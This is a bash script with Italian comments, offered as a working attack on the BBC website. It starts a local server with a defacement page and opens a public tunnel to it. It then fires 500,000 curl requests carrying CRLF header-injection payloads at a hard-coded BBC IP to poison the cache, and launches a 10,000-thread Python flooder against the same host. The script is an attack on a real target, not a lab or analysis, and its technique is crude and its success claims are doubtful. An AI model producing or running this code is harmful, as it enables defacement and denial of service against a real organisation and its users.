#!/bin/bash
# BBC_ROOT_NO_TORSOCKS_ERROR.sh - TORSOCKS FIXED DEFINITIVO
# www.bbc.co.uk/ → TUO TRUSTEDF57.html - ZERO ERRORI

HTML_FILE="TRUSTEDF57.html"

echo "💀 BBC ROOT KILLER - NO TORSOCKS ERRORS"
echo "[+] HTML: $HTML_FILE"

# VERIFICA HTML ESISTE
[ -f "$HTML_FILE" ] || { echo "❌ $HTML_FILE NON TROVATO!"; exit 1; }
echo "[+] OK: $(stat -c %s $HTML_FILE) bytes"

# KILL EVERYTHING
pkill -f http.server >/dev/null 2>&1 || true
pkill -f ngrok >/dev/null 2>&1 || true
pkill -f ssh.*serveo >/dev/null 2>&1 || true
pkill -f bbc_root >/dev/null 2>&1 || true
sleep 2

# TORSOCKS FIX DEFINITIVO - NO OPZIONI STRANE
if command -v torsocks >/dev/null 2>&1; then
    TORSOCKS="torsocks"
    echo "[+] Torsocks trovato"
else
    TORSOCKS=""
    echo "[+] No torsocks - uso curl normale"
fi

safe_curl() {
    if [ "$TORSOCKS" ]; then
        $TORSOCKS curl -s -m 3 "$@"
    else
        curl -s -m 3 "$@"
    fi
}

# 1. PYTHON SERVER SEMPLICE
echo "[+] Avvio server localhost:8080"
nohup python3 -m http.server 8080 --bind 127.0.0.1 > /dev/null 2>&1 &
SERVER_PID=$!
sleep 6

# TEST
curl -s "http://127.0.0.1:8080/$HTML_FILE" | head -1

# 2. TUNNEL - NGROK O SERVE0 SEMPLICE
echo "[+] Tunnel pubblico"
if command -v ngrok >/dev/null 2>&1; then
    nohup ngrok http 8080 > ngrok.log 2>&1 &
    TUNNEL_PID=$!
    sleep 10
    PUBLIC_URL=$(grep -o 'https://[0-9a-z-]*\.ngrok\.io' ngrok.log | head -1)
else
    nohup ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &
    TUNNEL_PID=$!
    sleep 15
    PUBLIC_URL=$(grep -o 'https://[0-9a-z-]*\.serveo\.net' serveo.log | head -1)
fi

DEFACE_URL="${PUBLIC_URL%/}/$HTML_FILE"
echo "🔗 TUO DEFACE: $DEFACE_URL"
safe_curl "$DEFACE_URL" | head -1

# 3. BBC ROOT ATTACK - 500K SHOTS
BBC_IP="132.185.210.70"
echo "[+] BBC ROOT POISON - 500K shots su $BBC_IP"

for i in $(seq 1 500000); do
    safe_curl "http://$BBC_IP/" \
        -H "Host: www.bbc.co.uk" \
        -H "User-Agent: Googlebot/2.1" \
        --data-urlencode "q=%0d%0aLocation:%20$DEFACE_URL%0d%0aContent-Type:%20text/html" \
        >/dev/null 2>&1 &
    
    [ $((i % 5000)) -eq 0 ] && echo "[+] $i/500K - $(date)"
done

wait
echo "✅ 500K SHOTS COMPLETE!"

# 4. INFINITE FLOODER PYTHON
cat > bbc_flood.py << 'EOF'
#!/usr/bin/env python3
from requests import Session
from threading import Thread
from time import sleep
import random
import urllib.parse
import sys

s = Session()
deface = sys.argv[1]
bbc_ip = "132.185.210.70"

def poison():
    while True:
        try:
            s.get(f"http://{bbc_ip}/", params={'q': urllib.parse.quote(f"\r\nLocation: {deface}\r\nContent-Type: text/html")}, 
                  headers={'Host': 'www.bbc.co.uk', 'User-Agent': 'Googlebot/2.1'}, timeout=2)
        except: pass

print("BBC ROOT FLOOD START")
threads = []
for i in range(10000):
    t = Thread(target=poison, daemon=True)
    t.start()
    threads.append(t)

while True:
    sleep(30)
    print(f"Threads: {len([t for t in threads if t.is_alive()])}")
EOF

chmod +x bbc_flood.py
echo "[+] Avvio 10K threads infiniti"
nohup ./bbc_flood.py "$DEFACE_URL" > flood.log 2>&1 &
FLOOD_PID=$!

# 5. MONITOR
echo ""
echo "✅ ATTACK RUNNING - NO ERRORS!"
echo ""
echo "📊 COMANDI MONITOR:"
echo "tail -f flood.log"
echo ""
cat > test.sh << EOF
#!/bin/bash
echo "=== BBC ROOT TEST ==="
echo "\$(date)"
safe_curl "http://$BBC_IP/" -H "Host: www.bbc.co.uk" --data "q=test" | grep -iE "location|$DEFACE_URL" || echo "Ancora no..."
safe_curl "$DEFACE_URL" | head -1
EOF

chmod +x test.sh
echo "./test.sh   # Test manuale"
echo ""
echo "🔥 PIDS:"
echo "Server: $SERVER_PID"
echo "Tunnel: $TUNNEL_PID" 
echo "Flood:  $FLOOD_PID"
echo ""
echo "💀 BBC ROOT POISON IN CORSO - Aspetta 10-60min per cache hit"

# KEEP RUNNING
while true; do
    sleep 60
    echo "$(date) - Running..."
done
